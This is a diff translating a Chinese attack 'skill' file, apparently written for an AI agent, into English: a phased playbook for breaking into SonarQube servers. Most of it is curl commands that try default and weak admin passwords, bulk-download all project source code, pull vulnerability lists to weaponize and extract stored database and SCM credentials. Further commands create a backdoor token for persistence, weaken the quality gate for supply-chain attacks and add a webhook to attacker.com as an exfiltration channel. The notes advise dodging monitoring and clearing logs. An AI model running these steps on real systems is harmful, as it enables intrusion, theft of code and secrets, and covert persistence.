@@ -1,59 +1,61 @@
 ---
 name: sonarqube-tactics
-description: "SonarQube 代码审计平台攻击。当发现目标运行 SonarQube 实例（默认 9000 端口）、默认凭据 admin/admin 未修改、或需要从 SonarQube 窃取项目源代码和漏洞信息时使用。覆盖默认凭据攻击、项目源代码窃取、漏洞/Issue 枚举（CRITICAL 优先）、用户凭据与 Token 窃取、Quality Gate 绕过、配置文件提取（数据库/SCM 凭据）、Webhook 滥用、插件分析、热点与度量数据导出"
+description: "SonarQube code audit platform attacks. Use when a target is found running a SonarQube instance (default port 9000), when the default credentials admin/admin have not been changed, or when project source code and vulnerability information must be stolen from SonarQube. Covers default credential attacks, project source code theft, vulnerability/issue enumeration (CRITICAL first), user credential and token theft, Quality Gate bypass, configuration file extraction (database/SCM credentials), webhook abuse, plugin analysis, and hotspot and metrics data export"
+zh-signals: "针对 SonarQube 代码审计平台的攻击方法，覆盖默认凭据、源码窃取、漏洞枚举、Token 窃取与配置提取。信号:SonarQube,代码审计,默认凭据,源码泄露,DevSecOps"
+when-to-use: "Use when a target runs SonarQube (default port 9000), default admin credentials are unchanged, or source code and vulnerability data must be extracted from it in an authorized assessment."
 metadata:
-  tags: "sonarqube,9000,代码审计,source-code,quality-gate,webhook,token,admin,漏洞扫描,devops"
+  tags: "sonarqube,9000,code audit,source-code,quality-gate,webhook,token,admin,vulnerability scanning,devops"
   category: "postexploit"
 ---
 
-# SonarQube 代码审计平台攻击
+# SonarQube Code Audit Platform Attacks
 
-SonarQube 是 DevSecOps 体系中的核心代码质量平台，默认监听 9000 端口，出厂凭据 admin/admin 常被忽略。一旦被攻破，攻击者可直接获取全部项目源代码、已知漏洞清单和内部凭据——相当于拿到整个研发体系的安全蓝图。
+SonarQube is the core code quality platform in a DevSecOps stack, listens on port 9000 by default, and the factory credentials admin/admin are frequently overlooked. Once compromised, an attacker can directly obtain all project source code, the list of known vulnerabilities, and internal credentials — effectively the security blueprint of the entire R&D organization.
 
-## ⛔ 深入参考（必读）
-- 完整 API 调用与利用命令 → 读 [references/attack-techniques.md](references/attack-techniques.md)
+## ⛔ Further Reading (Must Read)
+- Complete API calls and exploitation commands → read [references/attack-techniques.md](references/attack-techniques.md)
 
 ---
 
-## Phase 1: 服务发现与版本识别
+## Phase 1: Service Discovery and Version Identification
 
-### 1.1 Nmap 扫描
+### 1.1 Nmap Scan
 
 ```bash
-# SonarQube 默认端口探测
+# Probe the default SonarQube port
 nmap -sV -p 9000 TARGET
 
-# HTTP 标题探测
+# HTTP title probe
 nmap -p 9000 --script http-title TARGET
 ```
 
-### 1.2 版本确认
+### 1.2 Version Confirmation
 
 ```bash
-# 获取 SonarQube 版本（无需认证）
+# Obtain the SonarQube version (no authentication required)
 curl -s http://TARGET:9000/api/server/version
 
-# 系统状态（无需认证）
+# System status (no authentication required)
 curl -s http://TARGET:9000/api/system/status | jq .
 ```
 
-**关键判断**：
-- 返回版本号（如 `9.9.0.12345`） → 实例存活，进入 Phase 2
-- 返回 HTML 页面 → 可能有反向代理，检查 `/api/server/version` 路径
-- 版本 < 8.9 → 可能存在更多未修复的已知漏洞
+**Key Decision**:
+- A version number is returned (e.g. `9.9.0.12345`) → the instance is alive, proceed to Phase 2
+- An HTML page is returned → there may be a reverse proxy, check the `/api/server/version` path
+- Version < 8.9 → there may be more unpatched known vulnerabilities
 
 ---
 
-## Phase 2: 默认凭据检测
+## Phase 2: Default Credential Detection
 
-### 2.1 默认凭据尝试
+### 2.1 Default Credential Attempts
 
 ```bash
-# 出厂默认: admin/admin
+# Factory default: admin/admin
 curl -s -u admin:admin "http://TARGET:9000/api/authentication/validate" | jq .
-# 返回 {"valid":true} 即登录成功
+# {"valid":true} means the login succeeded
 
-# 常见弱凭据
+# Common weak credentials
 for creds in "admin:admin" "admin:sonarqube" "admin:password" "admin:admin123"; do
   echo "Testing $creds"
   result=$(curl -s -u "$creds" "http://TARGET:9000/api/authentication/validate")
@@ -61,92 +63,92 @@ for creds in "admin:admin" "admin:sonarqube" "admin:password" "admin:admin123"; 
 done
 ```
 
-### 2.2 Token 认证测试
+### 2.2 Token Authentication Test
 
 ```bash
-# SonarQube Token 作为用户名，密码留空
+# The SonarQube token is used as the username, with an empty password
 curl -s -u "squ_xxxxxxxxxxxx:" "http://TARGET:9000/api/authentication/validate"
 ```
 
-**关键判断**：
-- `{"valid":true}` → 凭据有效，进入 Phase 3 决策树
-- `{"valid":false}` → 凭据无效，尝试其他弱口令组合
-- 401 Unauthorized → 需认证，尝试 Token 或爆破
+**Key Decision**:
+- `{"valid":true}` → the credentials are valid, proceed to the Phase 3 decision tree
+- `{"valid":false}` → the credentials are invalid, try other weak password combinations
+- 401 Unauthorized → authentication is required, try a token or brute-forcing
 
 ---
 
-## Phase 3: 攻击决策树
+## Phase 3: Attack Decision Tree
 
 ```
-凭据有效？
-├─ 管理员权限 → 全攻击面
-│   ├─ 项目源代码窃取 (Phase 4)
-│   ├─ 漏洞信息武器化 (Phase 5)
-│   ├─ 用户枚举 + Token 窃取 → 横向移动
-│   ├─ Quality Gate 绕过 → 供应链攻击
-│   ├─ 配置提取 → 数据库/SCM 凭据
-│   ├─ Webhook 创建 → 数据外泄通道
-│   └─ 插件分析 → LDAP/SAML 凭据
-├─ 普通用户权限
-│   ├─ 可见项目源代码窃取 (Phase 4)
-│   ├─ 可见项目漏洞枚举 (Phase 5)
-│   └─ 个人 Token 生成 → 持久化访问
-└─ 无认证（公共实例 / Force Authentication = false）
-    ├─ 公开项目源代码窃取 (Phase 4)
-    └─ 公开项目漏洞枚举 (Phase 5)
+Are the credentials valid?
+├─ Administrator privileges → the full attack surface
+│   ├─ Project source code theft (Phase 4)
+│   ├─ Vulnerability information weaponization (Phase 5)
+│   ├─ User enumeration + token theft → lateral movement
+│   ├─ Quality Gate bypass → supply chain attack
+│   ├─ Configuration extraction → database/SCM credentials
+│   ├─ Webhook creation → data exfiltration channel
+│   └─ Plugin analysis → LDAP/SAML credentials
+├─ Regular user privileges
+│   ├─ Source code theft from visible projects (Phase 4)
+│   ├─ Vulnerability enumeration on visible projects (Phase 5)
+│   └─ Personal token generation → persistent access
+└─ Unauthenticated (public instance / Force Authentication = false)
+    ├─ Source code theft from public projects (Phase 4)
+    └─ Vulnerability enumeration on public projects (Phase 5)
 ```
 
-**前置信息收集**：
+**Preliminary Information Gathering**:
 
 ```bash
-# 确认当前用户权限
+# Confirm the current user privileges
 curl -s -u admin:admin "http://TARGET:9000/api/users/current" | jq .
 
-# 检查是否需要认证（sonar.forceAuthentication）
+# Check whether authentication is required (sonar.forceAuthentication)
 curl -s "http://TARGET:9000/api/settings/values?keys=sonar.forceAuthentication" \
   -u admin:admin | jq .
 
-# 列出所有项目（评估攻击面规模）
+# List all projects (assess the size of the attack surface)
 curl -s -u admin:admin \
   "http://TARGET:9000/api/projects/search?ps=500" | jq '.paging.total'
 ```
 
 ---
 
-## Phase 4: 源代码窃取速查
+## Phase 4: Source Code Theft Quick Reference
 
-### 4.1 项目与组件枚举
+### 4.1 Project and Component Enumeration
 
 ```bash
-# 列出所有项目 key
+# List all project keys
 curl -s -u admin:admin \
   "http://TARGET:9000/api/projects/search?ps=500" | \
   jq -r '.components[].key'
 
-# 获取项目文件树
+# Obtain the project file tree
 curl -s -u admin:admin \
   "http://TARGET:9000/api/components/tree?component=PROJECT_KEY&ps=500&qualifiers=FIL" | \
   jq -r '.components[].key'
 ```
 
-### 4.2 源码下载
+### 4.2 Source Code Download
 
 ```bash
-# 按文件下载源码
+# Download the source code file by file
 curl -s -u admin:admin \
   "http://TARGET:9000/api/sources/raw?key=PROJECT_KEY:src/main/java/App.java" \
   -o App.java
 
-# 带行号的源码查看
+# View the source code with line numbers
 curl -s -u admin:admin \
   "http://TARGET:9000/api/sources/lines?key=PROJECT_KEY:pom.xml&from=1&to=500" | \
   jq -r '.sources[].line + ": " + .sources[].code'
 ```
 
-### 4.3 批量下载脚本
+### 4.3 Batch Download Script
 
 ```bash
-# 枚举所有文件并逐一下载
+# Enumerate all files and download them one by one
 PROJECT="PROJECT_KEY"
 for file in $(curl -s -u admin:admin \
   "http://TARGET:9000/api/components/tree?component=$PROJECT&ps=500&qualifiers=FIL" | \
@@ -158,62 +160,62 @@ for file in $(curl -s -u admin:admin \
 done
 ```
 
-→ 更多源代码窃取技巧 → 读 [references/attack-techniques.md](references/attack-techniques.md)
+→ More source code theft techniques → read [references/attack-techniques.md](references/attack-techniques.md)
 
 ---
 
-## Phase 5: 漏洞信息武器化速查
+## Phase 5: Vulnerability Information Weaponization Quick Reference
 
-### 5.1 CRITICAL 漏洞优先枚举
+### 5.1 CRITICAL Vulnerability Enumeration First
 
 ```bash
-# 所有 CRITICAL 级别漏洞（直接可利用）
+# All CRITICAL severity vulnerabilities (directly exploitable)
 curl -s -u admin:admin \
   "http://TARGET:9000/api/issues/search?types=VULNERABILITY&severities=CRITICAL&ps=500" | \
   jq '.issues[] | {rule: .rule, message: .message, component: .component, line: .line}'
 
-# 搜索含敏感关键词的 Issue
+# Search for issues containing sensitive keywords
 curl -s -u admin:admin \
   "http://TARGET:9000/api/issues/search?ps=500" | \
   jq '.issues[] | select(.message | test("password|secret|token|credential|hardcoded"; "i"))'
 ```
 
-### 5.2 安全热点枚举
+### 5.2 Security Hotspot Enumeration
 
 ```bash
-# Security Hotspots（需人工审查的安全点）
+# Security Hotspots (security points that require manual review)
 curl -s -u admin:admin \
   "http://TARGET:9000/api/hotspots/search?projectKey=PROJECT_KEY&ps=500" | \
   jq '.hotspots[] | {key: .key, message: .message, component: .component, vulnerabilityProbability: .vulnerabilityProbability}'
 ```
 
-### 5.3 度量数据导出
+### 5.3 Metrics Data Export
 
 ```bash
-# 项目安全度量
+# Project security metrics
 curl -s -u admin:admin \
   "http://TARGET:9000/api/measures/component?component=PROJECT_KEY&metricKeys=bugs,vulnerabilities,code_smells,security_hotspots,coverage" | \
   jq '.component.measures[]'
 ```
 
-→ 完整漏洞枚举与武器化方法 → 读 [references/attack-techniques.md](references/attack-techniques.md)
+→ Complete vulnerability enumeration and weaponization methods → read [references/attack-techniques.md](references/attack-techniques.md)
 
 ---
 
-## Phase 6: 用户凭据与 Token 窃取
+## Phase 6: User Credential and Token Theft
 
 ```bash
-# 枚举所有用户
+# Enumerate all users
 curl -s -u admin:admin \
   "http://TARGET:9000/api/users/search?ps=500" | \
   jq '.users[] | {login: .login, name: .name, email: .email, groups: .groups}'
 
-# 查看用户 Token（需管理员）
+# View user tokens (requires administrator)
 curl -s -u admin:admin \
   "http://TARGET:9000/api/user_tokens/search?login=USERNAME" | \
   jq '.userTokens[]'
 
-# 为目标用户生成新 Token（持久化后门）
+# Generate a new token for the target user (persistent backdoor)
 curl -s -X POST -u admin:admin \
   "http://TARGET:9000/api/user_tokens/generate" \
   -d "name=backup-token&login=USERNAME" | jq .
@@ -221,19 +223,19 @@ curl -s -X POST -u admin:admin \
 
 ---
 
-## Phase 7: 配置与凭据提取
+## Phase 7: Configuration and Credential Extraction
 
 ```bash
-# 导出全局配置（含数据库/SCM 凭据）
+# Export the global configuration (including database/SCM credentials)
 curl -s -u admin:admin \
   "http://TARGET:9000/api/settings/values" | \
   jq '.settings[] | select(.key | test("password|token|secret|jdbc|scm|ldap|smtp"; "i"))'
 
-# 数据库连接信息
+# Database connection information
 curl -s -u admin:admin \
   "http://TARGET:9000/api/settings/values?keys=sonar.jdbc.url,sonar.jdbc.username" | jq .
 
-# ALM（代码托管平台）集成配置
+# ALM (source code hosting platform) integration configuration
 curl -s -u admin:admin \
   "http://TARGET:9000/api/settings/values" | \
   jq '.settings[] | select(.key | test("github|gitlab|bitbucket|azure"; "i"))'
@@ -241,60 +243,60 @@ curl -s -u admin:admin \
 
 ---
 
-## Phase 8: Quality Gate 绕过与 Webhook 滥用
+## Phase 8: Quality Gate Bypass and Webhook Abuse
 
-### 8.1 Quality Gate 绕过
+### 8.1 Quality Gate Bypass
 
 ```bash
-# 列出所有 Quality Gate
+# List all Quality Gates
 curl -s -u admin:admin \
   "http://TARGET:9000/api/qualitygates/list" | jq '.qualitygates[]'
 
-# 创建宽松 Quality Gate（供应链攻击）
+# Create a permissive Quality Gate (supply chain attack)
 curl -s -X POST -u admin:admin \
   "http://TARGET:9000/api/qualitygates/create" -d "name=Permissive"
 
-# 将项目关联到宽松 Gate
+# Associate the project with the permissive gate
 curl -s -X POST -u admin:admin \
   "http://TARGET:9000/api/qualitygates/select" \
   -d "gateId=GATE_ID&projectKey=PROJECT_KEY"
 ```
 
-### 8.2 Webhook 滥用
+### 8.2 Webhook Abuse
 
 ```bash
-# 创建 Webhook（数据外泄通道）
+# Create a webhook (data exfiltration channel)
 curl -s -X POST -u admin:admin \
   "http://TARGET:9000/api/webhooks/create" \
   -d "name=notify&url=https://attacker.com/hook&project=PROJECT_KEY"
 
-# 列出已有 Webhook
+# List the existing webhooks
 curl -s -u admin:admin \
   "http://TARGET:9000/api/webhooks/list?project=PROJECT_KEY" | jq '.webhooks[]'
 ```
 
-→ 读 [references/attack-techniques.md](references/attack-techniques.md) 获取插件分析与批量导出技术
+→ Read [references/attack-techniques.md](references/attack-techniques.md) for plugin analysis and bulk export techniques
 
 ---
 
-## 工具速查
+## Tool Quick Reference
 
-| 工具 | 用途 |
+| Tool | Purpose |
 |------|------|
-| curl + jq | SonarQube REST API 交互的核心组合 |
-| nmap | 端口发现与服务版本探测 |
-| sonarqube-scanner | 官方扫描器，可用于理解项目分析流程 |
-| hydra | Web 表单凭据爆破 |
-| nuclei | SonarQube 默认凭据与已知漏洞模板扫描 |
+| curl + jq | The core combination for interacting with the SonarQube REST API |
+| nmap | Port discovery and service version probing |
+| sonarqube-scanner | The official scanner, useful for understanding the project analysis flow |
+| hydra | Web form credential brute-forcing |
+| nuclei | SonarQube default credential and known vulnerability template scanning |
 
 ---
 
-## 注意事项
+## Notes
 
-- SonarQube API 默认分页，`ps` 参数最大 500，超过需用 `p` 参数翻页遍历
-- `/api/sources/raw` 按文件返回源码，大项目需脚本批量下载
-- Token 生成后明文仅显示一次；已有 Token 只能看到名称和创建时间，无法恢复明文
-- Quality Gate 修改会影响 CI/CD 流水线，可能被运维监控发现
-- Webhook 创建后每次项目分析完成会触发回调，注意控制回调频率避免暴露
-- 配置 API 中部分敏感字段（如密码）可能被遮蔽显示为 `*****`，需结合其他手段获取
-- 操作日志可通过 `/api/ce/activity` 查看，注意清理或控制操作频率
+- The SonarQube API paginates by default, the `ps` parameter caps at 500, use the `p` parameter to page through larger result sets
+- `/api/sources/raw` returns the source code per file, large projects need a script for batch download
+- A generated token's plaintext is displayed only once; existing tokens only show the name and creation time, the plaintext cannot be recovered
+- Quality Gate modifications affect the CI/CD pipeline and may be detected by operations monitoring
+- After a webhook is created, a callback fires every time a project analysis completes, control the callback frequency to avoid exposure
+- Some sensitive fields in the configuration API (such as passwords) may be masked and shown as `*****`, use other means to obtain them
+- The activity log can be viewed through `/api/ce/activity`, remember to clean up or control the frequency of operations
